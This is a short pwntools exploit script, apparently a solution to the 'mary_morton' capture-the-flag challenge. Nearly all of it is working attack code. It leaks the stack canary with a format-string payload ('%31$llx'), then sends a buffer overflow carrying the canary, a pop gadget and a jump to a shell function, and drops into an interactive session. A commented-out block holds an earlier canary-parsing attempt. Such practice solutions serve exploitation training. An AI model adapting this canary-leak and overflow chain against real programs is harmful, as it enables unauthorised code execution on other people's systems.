from pwn import *

target = process('./mary_morton')
print(target.recvuntil(b"Exit the battle"))
target.sendline(b"2")
gdb.attach(target, gdbscript = 'b *(0x400949)')
target.sendline(b"canary:%31$llx")
print(target.recvuntil(b"canary:"))
canary_init = target.recvline()
canary = p64(int(b"0x" + canary_init[:16], 16))
popR15R14 = p64(0x400ab0)
shell = p64(0x4008da)
target.sendline(b"1")
gdb.attach(target, gdbscript = "b *(0x4009c3)")
target.sendline(b"A" * 136 + canary + b"A" * 8 + popR15R14 + p64(0x0) + p64(0x0) + shell)

"""
canary_pre = canary_init[:8]
canary_int = 0
count = 0
for i in canary_pre:
    if count == 0:
        i <<= 8
        canary_int |= i
    if 0 < count < 7:
        i <<= 8 + (8 * count)
        canary_int += i
    count += 1

canary = p64(int(hex(canary_int), 16))
print(hex(canary_int))
"""
target.interactive()
